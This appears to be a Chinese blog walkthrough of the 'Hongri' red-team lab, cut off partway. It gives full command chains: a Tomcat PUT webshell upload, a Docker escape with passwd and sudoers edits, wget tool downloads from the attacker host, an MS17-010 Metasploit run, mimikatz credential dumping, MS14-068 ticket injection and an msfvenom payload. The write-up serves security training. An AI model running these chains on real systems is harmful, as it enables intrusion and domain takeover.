@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>49.内网2-红日七 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="ATT&amp;CK红队评估实战靶场四   靶机信息 账号密码 123ubuntu:ubuntu域成员机器：douser:Dotest123DC:administrator:Test2008  先进入ubuntu启动web,开启3个环境 1234sudo suubuntu cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;struts2&#x2F;s2-045 docker-compose up">
+<meta property="og:type" content="article">
+<meta property="og:title" content="49.内网2-红日七">
+<meta property="og:url" content="http://example.com/2024/01/01/%E9%9D%B6%E6%9C%BA/48-%E5%86%85%E7%BD%91/49-%E7%BA%A2%E6%97%A5%E4%BA%8C/49-%E5%86%85%E7%BD%912-%E7%BA%A2%E6%97%A5%E4%BA%8C/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ATT&amp;CK红队评估实战靶场四   靶机信息 账号密码 123ubuntu:ubuntu域成员机器：douser:Dotest123DC:administrator:Test2008  先进入ubuntu启动web,开启3个环境 1234sudo suubuntu cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;struts2&#x2F;s2-045 docker-compose up">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304191421815.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304191845802.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304193728310.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304194203191.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304194304250.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304194507820.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304194609680.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304195016417.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304195227861.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304195315467.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304195452422.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304195931159.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304200012362.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304201536170.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304201730112.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304201950370.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304202048386.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304202203810.png">
+<meta property="og:image" content="http://example.com/2024/01/01/%E9%9D%B6%E6%9C%BA/48-%E5%86%85%E7%BD%91/49-%E7%BA%A2%E6%97%A5%E4%BA%8C/49-%E5%86%85%E7%BD%912-%E7%BA%A2%E6%97%A5%E4%BA%8C/49-%E5%86%85%E7%BD%912.assets/image-20240304202226047.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304203351835.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304203504509.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304204338951.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304204419094.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304204558290.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304211036193.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306153210204.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306153755085.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306154107889.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306154327923.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306155018655.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306154429969.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306154800902.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306160932625.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306161039604.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306161427754.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306161612541.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306161839742.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306162426050.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306163048446.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306163326366.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306163646834.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306164032153.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306164128612.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306173239037.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306173254047.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306190351327.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306191007204.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306191432815.png">
+<meta property="og:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240306194753725.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-07T07:35:15.971Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/49-%E5%86%85%E7%BD%912.assets/image-20240304191421815.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-靶机/48-内网/49-红日二/49-内网2-红日二" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/01/01/%E9%9D%B6%E6%9C%BA/48-%E5%86%85%E7%BD%91/49-%E7%BA%A2%E6%97%A5%E4%BA%8C/49-%E5%86%85%E7%BD%912-%E7%BA%A2%E6%97%A5%E4%BA%8C/" class="article-date">
+  <time class="post-time" datetime="2023-12-31T16:00:00.000Z" itemprop="datePublished">
+    <span class="post-month">1月</span><br/>
+    <span class="post-day">01</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      49.内网2-红日七
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>ATT&amp;CK红队评估实战靶场四</strong></p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304191421815.png" alt="image-20240304191421815"></p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304191845802.png" alt="image-20240304191845802"></p>
+<p>靶机信息</p>
+<p>账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu:ubuntu</span><br><span class="line">域成员机器：douser:Dotest123</span><br><span class="line">DC:administrator:Test2008</span><br></pre></td></tr></table></figure>
+
+<p>先进入ubuntu启动web,开启3个环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">ubuntu cd /home/ubuntu/Desktop/vulhub/struts2/s2-045 docker-compose up -d </span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/ docker-compose up -d </span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/ docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>IP地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Kali：192.168.2.152 192.168.13</span><br><span class="line">Ubuntu：192.168.2.110 192.168.183.135</span><br><span class="line">域成员：192.168.183.140</span><br><span class="line">DC：192.168.183.130</span><br></pre></td></tr></table></figure>
+
+<p>本次靶场渗透反序列化漏洞、命令执行漏洞、Tomcat漏洞、MS系列漏洞、端口转发漏洞、以及域渗透等多种组合漏洞</p>
+<p>主机发现</p>
+<p>知道IP&#x3D;192.168.2.139</p>
+<p>先使用nmap进行端口扫描，对目标进行端口的发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.2.110</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304193728310.png" alt="image-20240304193728310"></p>
+<p>在kali中使用nmap对目标主机进行扫描，发现了192.168.0.102的主机，并开启了22、2001、2002、2003端口都开启了tcp服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -p- -sV -f -A 192.168.2.110</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-T5</code>：设置扫描的时序模板为5（最快），这会加快扫描速度，但可能会降低准确性并增加网络噪音</li>
+<li><code>-p-</code>：扫描目标主机的所有65535个端口</li>
+<li><code>-sV</code>：探测服务版本信息</li>
+<li><code>-f</code>：分段扫描，将扫描包分割成更小的数据包，可能用于逃避一些包过滤或防火墙</li>
+<li><code>-A</code>：进行全面扫描，包括操作系统检测、版本检测、脚本扫描和traceroute</li>
+</ul>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304194203191.png" alt="image-20240304194203191"></p>
+<p>在浏览器中进行访问主机的2001端口，此时可以看到浏览的结果，上传文件后发现没有任何反应，此时发现上传之后url的后缀名发现是以.action结尾的，action可能是Java语言编写的，判断可能存在struts2的漏洞</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304194304250.png" alt="image-20240304194304250"></p>
+<p>使用漏扫工具检测struts2有无漏洞，这里发现存在S2-045、S2-046两个漏洞</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304194507820.png" alt="image-20240304194507820"></p>
+<p>使用S2-046漏洞发现能够命令回显与命令执行</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304194609680.png" alt="image-20240304194609680"></p>
+<p>查看系统文件</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304195016417.png" alt="image-20240304195016417"></p>
+<p>存在 dockerenv 文件，可能是在docker中，因此需要进行docker逃逸</p>
+<p>通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。在进行挂载的时候发现没有可以挂载的光盘，无法挂载光盘，就无法向下进行，逃逸失败</p>
+<p>查看2002端口</p>
+<p>2002端口是一个apache tomcat 8.5.19</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304195227861.png" alt="image-20240304195227861"></p>
+<p>对该版本的tomcat进行漏洞查找，发现该版本存在CVE-2017-12617漏洞，这个漏洞CVE- 2017-12615是 Tomcat远程代码执行漏洞(PUT请求)，可以使用PUT方法上传任意文件</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304195315467.png" alt="image-20240304195315467"></p>
+<p>用yakit进行抓包，进行上传jsp的木马文件</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304195452422.png" alt="image-20240304195452422"></p>
+<p>jsp的文件是冰蝎默认jsp木马</p>
+<p>然后使用冰蝎连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">抓包</span><br><span class="line">PUT   /shell.jsp/</span><br><span class="line">上传冰蝎马文件(java冰蝎好用)返回201成功上传</span><br><span class="line">/截断</span><br><span class="line">密码rebeyond</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304195931159.png" alt="image-20240304195931159"></p>
+<p>连接成功，是root权限</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304200012362.png" alt="image-20240304200012362"></p>
+<p>文件管理中查看根目录下的的文件依旧发现dockerenv文件，所以是虚拟机的root权限，不是主机的，需要进行docker逃逸</p>
+<p>观察tomcat的.yml文件，发现privileged:true，说明这个容器是特权模式，可以以此提权</p>
+<p>提权原理，将宿主机&#x2F;dev&#x2F;sda1硬盘挂载到容器内，使我们可以直接操作宿主机文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir /tmp/123</span><br><span class="line">mount /dev/sda1 /tmp/123</span><br><span class="line">ls 123  </span><br></pre></td></tr></table></figure>
+
+<p>这时候发现这些文件都是宿主机的</p>
+<p>在linux中用户判定，&#x2F;etc&#x2F;passwd用户是否存在；&#x2F;etc&#x2F;shadow用户的密码</p>
+<p>尝试进行修改这些文件发现，能够进行修改文件，然后在相同版本的ubuntu中进行创建用户密码，复制到此文件中</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304201536170.png" alt="image-20240304201536170"></p>
+<p>目标主机是ubuntu14.04，所以去docker上的ubuntu14.04创个用户，截取用户的passwd和shadow信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username:$1$JqGkWM82$0HuVeRbQzLwpaFID0wImz1:1000:1000::/home/username:/bin/bash</span><br><span class="line">username:$1$JqGkWM82$0HuVeRbQzLwpaFID0wImz1:19120:0:99999:7:::</span><br><span class="line">密码12345678</span><br><span class="line">$1$JqGkWM82$0HuVeRbQzLwpaFID0wImz1</span><br><span class="line">username:$1$JqGkWM82$0HuVeRbQzLwpaFID0wImz1:1001:1001::/home/username:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304201730112.png" alt="image-20240304201730112"></p>
+<p>利用冰蝎文件管理直接修改文件，ssh登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@192.168.2.110</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304201950370.png" alt="image-20240304201950370"></p>
+<p>但是是一般权限</p>
+<p>进行提权时，发现不在 sudoers 文件中，不能进行提权</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304202048386.png" alt="image-20240304202048386"></p>
+<p>修改&#x2F;tmp&#x2F;test&#x2F;etc&#x2F;sudoers添加一句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Members of the admin group may gain root privileges</span><br><span class="line">%admin ALL=(ALL) ALL</span><br><span class="line">username ALL=(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304202203810.png" alt="image-20240304202203810"></p>
+<p>sudo -i密码12345678即可获得root权限</p>
+<img src="49-内网2.assets/image-20240304202226047.png" alt="image-20240304202226047" style="zoom:150%;" />
+
+<p>chisel代理工具进行流量转发</p>
+<p>chisel 是一个用Go编写的快速而简单的反向代理&#x2F;Tunnel&#x2F;VPN软件，它可以用于穿透防火墙。chisel 使用客户端-服务器模型，其中服务器监听传入的客户端连接，然后允许客户端通过安全的通道进行各种网络请求</p>
+<ul>
+<li>.&#x2F;chisel 表示在当前目录下执行名为 chisel 的可执行文件</li>
+<li>server 指明运行 chisel 的服务器模式</li>
+<li>-p 9001 设置服务器监听的端口为 9001</li>
+<li>-socks5 启用 SOCKS5 代理功能</li>
+</ul>
+<p>执行该命令将会启动一个 chisel 服务器实例，该服务器会监听本地的 9001 端口并提供 SOCKS5 代理服务。客户端可以连接到这个服务器并通过 SOCKS5 代理进行网络通信，从而绕过网络限制或进行匿名通信</p>
+<p>上传chisel</p>
+<p>开启5555端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304203351835.png" alt="image-20240304203351835"></p>
+<p>ubuntu中开启下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.2.152:5555/chisel</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304203504509.png" alt="image-20240304203504509">  </p>
+<p>开启连接</p>
+<p>ubuntu中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ./*</span><br><span class="line">./chisel server -p 9001 -socks5</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304204338951.png" alt="image-20240304204338951"></p>
+<p>kali中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.2.110:9001 1090:socks</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304204419094.png" alt="image-20240304204419094"></p>
+<p>连接成功</p>
+<p>进行内网扫描，开启代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf </span><br></pre></td></tr></table></figure>
+
+<p>  最后添加socks5 127.0.0.1 1090</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304204558290.png" alt="image-20240304204558290"></p>
+<p>上传fscan到ubuetu（同chisel）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.2.152:5555/fscan</span><br></pre></td></tr></table></figure>
+
+<p>fscan 是一款网络扫描和漏洞探测工具，通常用于渗透测试和网络安全审计。它可以执行多种类型的网络扫描，包括端口扫描、服务识别、操作系统识别等，并且可能包含针对特定漏洞的检测功能。fscan 设计用于快速地发现网络中的目标和潜在的安全风险</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -f /etc/proxychains4.conf  ./fscan -h 192.168.183.1-255</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240304211036193.png" alt="image-20240304211036193"></p>
+<p>发现ms17_010</p>
+<p>利用ms17_010漏洞对两台主机进行渗透测试，先利用ms17_010漏洞对win7这台主机进行测试</p>
+<p>启动漏洞msfconsole</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br><span class="line">use 0</span><br><span class="line">set target 1</span><br><span class="line">set rhost 192.168.183.133</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_rc4</span><br><span class="line">setg proxies socks5:127.0.0.1:1090</span><br><span class="line">run</span><br><span class="line">(注意，win7自动休眠了，IP更改183.133为了183.129)</span><br></pre></td></tr></table></figure>
+
+<p>(注意，win7自动休眠了，IP更改183.133为了183.129)</p>
+<p>(注意，win7自动休眠了，IP更改183.133为了183.129)</p>
+<p>(注意，win7自动休眠了，IP更改183.133为了183.129)</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306153210204.png" alt="image-20240306153210204"></p>
+<p>获得win7权限</p>
+<p>shell进入命令行</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306153755085.png" alt="image-20240306153755085"></p>
+<p>chcp 65001转换为中文</p>
+<p>进一步内网渗透</p>
+<p>查看这台主机的系统信息，可以发现这台主机存在域demo中</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306154107889.png" alt="image-20240306154107889"></p>
+<p>使用Dos命令net view查看了当前的网络计算机列表，发现有两台主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view </span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306154327923.png" alt="image-20240306154327923"></p>
+<p>主机是TESTWIN7-PC</p>
+<p>获取域控ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup WIN-ENS2VR5TR3N</span><br></pre></td></tr></table></figure>
+
+<p>也就是域控是Windows server 2008，所以win7也就是demo域中的域成员</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306155018655.png" alt="image-20240306155018655"></p>
+<p>在win7中还能够成功的ping通另一台主机Windows server 2008</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306154429969.png" alt="image-20240306154429969"></p>
+<p>查看win7中存在的用户，发现有douser、testclone和testwin7三个用户</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306154800902.png" alt="image-20240306154800902"></p>
+<p>获取用户之后，进一步获取用户的密码</p>
+<p>把明文密码抓取工具mimikatz上传到win7中</p>
+<p>上传与上面同样</p>
+<p>进入桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd c:\users\douser\desktop</span><br></pre></td></tr></table></figure>
+
+<p>发现存在ms14-068.exe与mimikatz.exe（不知道是之前上传的还是作者放到的）</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306160932625.png" alt="image-20240306160932625"></p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306161039604.png" alt="image-20240306161039604"></p>
+<p>发现需要用户名，域全名，明文密码，用户sid，域控ip，才能运行ms14_068</p>
+<p>在win7中执行mimikatz.exe，使用privilege::debug进行提权。提示权限不够不能够获取调试权限</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306161427754.png" alt="image-20240306161427754"></p>
+<p>使用exit回到meterpreter里面使用令牌窃取SYSTEM权限之后再进行mimikatz密码进行抓取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306161612541.png" alt="image-20240306161612541"></p>
+<p>获得用户明文密码Dotest123，域全名DEMO.com</p>
+<p>因为这里永恒之蓝打回来的是system权限，不在域里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">steal_token 2540</span><br></pre></td></tr></table></figure>
+
+<p>找个douser的进程uid注入，这样我们就在域里了</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306161839742.png" alt="image-20240306161839742"></p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306162426050.png" alt="image-20240306162426050"></p>
+<p>获得用户SID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">demo\douser S-1-5-21-979886063-1111900045-1414766810-1107</span><br></pre></td></tr></table></figure>
+
+<p>进入桌面ms14-068攻击域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14-068 -u douser@demo.com  -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130       </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获得TGT_douser@demo.com.ccache令牌</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306163048446.png" alt="image-20240306163048446"></p>
+<p>注入之前先查看注入前的权限，此时发现权限不够</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306163326366.png" alt="image-20240306163326366"></p>
+<p>需要清除内存中的所有票据将高权限的票据注入内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz</span><br><span class="line">kerberos::purge     //清空令牌 </span><br><span class="line">kerberos::ptc TGT_douser@demo.com.ccache     //令牌注入 kerberos::list        //查看令牌列表</span><br></pre></td></tr></table></figure>
+
+<p>当看到”Ticket(s) purge for current session is OK’时，表示清除成功</p>
+<p>双引号里面的是票据的名字</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306163646834.png" alt="image-20240306163646834"></p>
+<p>注入票据后再次查看权限，能够成功的查取</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306164032153.png" alt="image-20240306164032153"></p>
+<p>木马上线域控</p>
+<p>能够成功的查看另一台主机Windows server2008的目录信息</p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306164128612.png" alt="image-20240306164128612"></p>
+<p>在kali中生成一个正向连接的木马文件，上传到Windows server2008中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lhost=192.168.1.129 lport=4455 -f exe-service -o muma.exe</span><br></pre></td></tr></table></figure>
+
+<p>由于无法直接访问主机Windows server2008，先上传到win7中</p>
+<p>首先kali上传到ubuntu，端口监听同上</p>
+<p>ubuntu上传到win7</p>
+<p>ubuntu开启监听4444端口</p>
